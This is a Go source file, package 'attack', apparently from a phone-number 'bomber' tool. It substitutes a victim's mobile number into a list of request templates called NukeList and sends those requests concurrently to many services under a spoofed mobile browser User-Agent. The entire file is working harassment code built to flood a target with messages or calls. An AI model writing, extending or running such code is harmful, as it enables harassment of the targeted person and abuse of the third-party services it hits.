package attack

import (
	"fmt"
	"net/http"
	"bytes"
	"sync"
	"strings"
)

var g sync.WaitGroup 
var dumMap map[string]string 


func Hit( nuke NukeStruct, i int,  mobile_number string){ 

	for key, value := range nuke.Data {
		if value[0] == "6969696969" {
				nuke.Data.Set(key, mobile_number)
				break
		}
	}

	new_link := strings.ReplaceAll(nuke.Link, "6969696969", mobile_number)

	req, err := http.NewRequest(nuke.Method, new_link, bytes.NewBufferString(nuke.Data.Encode()))
    if err != nil {
        fmt.Println("Error creating request:", err)
        return
    }

    req.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36 EdgA/126.0.2592.80")

	for key, value := range nuke.Headers{
        req.Header.Set(key,value)
    }

    client := &http.Client{}
    resp, err := client.Do(req)

    if err != nil {
        fmt.Println(err)
    }else{
		fmt.Println(i,"]",mobile_number,"]",nuke.Name,"]",resp.StatusCode)
	}
}

func Attack(mobile_number string){ 

	max := 15
	rounds := 1
	w := make(chan struct{}, max)

	for r := 0; r < rounds ; r++ {
		for i,nuke := range NukeList { 
			g.Add(1)
			w <- struct{}{};
			go func(w chan struct{}){
				Hit(nuke,i,mobile_number)
				<- w
				defer g.Done()
			}(w)
		}
	} 
	
	g.Wait()

	fmt.Println("Attack completed")
}